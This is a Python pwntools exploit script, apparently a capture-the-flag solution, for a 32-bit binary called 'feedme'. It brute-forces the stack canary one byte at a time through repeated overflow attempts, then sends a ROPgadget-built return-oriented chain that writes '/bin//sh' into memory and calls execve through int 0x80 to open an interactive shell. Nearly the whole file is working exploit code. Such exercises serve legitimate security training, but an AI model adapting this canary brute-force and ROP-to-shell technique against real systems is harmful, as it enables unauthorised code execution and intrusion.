#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template feedme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'feedme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

# context.log_level = 'DEBUG'

io = start()
canary = b'\x00'

for i in range(3):
    for j in range(256):
        # print(f'i: {i} j: {j}')
        io.recvuntil(b'FEED ME!\n')
        
        io.send((33 + len(canary)).to_bytes(1, 'little'))
        io.send(b'A'*32)
        guess_byte = j.to_bytes(1, 'little')
        guess = canary + guess_byte
        io.send(guess)
        io.recvline()
        resp = io.recvline().decode()
        if 'YUM' in resp:
            print(f"byte found! canary: {canary}")
            canary += guess_byte
            break

# ROP Payload from ROPgadget

from struct import pack

# Padding goes here
p = b''

p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb496) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb496) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x0809a7ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806f371) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806f34a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054a10) # xor eax, eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x080497fe) # inc eax ; ret
p += pack('<I', 0x08049761) # int 0x80

io.recvuntil(b'FEED ME!\n')
io.send((len(p) + 32 + len(canary) + 12).to_bytes(1, 'little'))
io.send(b'A'*32 + canary + b'A'*12 + p)

io.interactive()

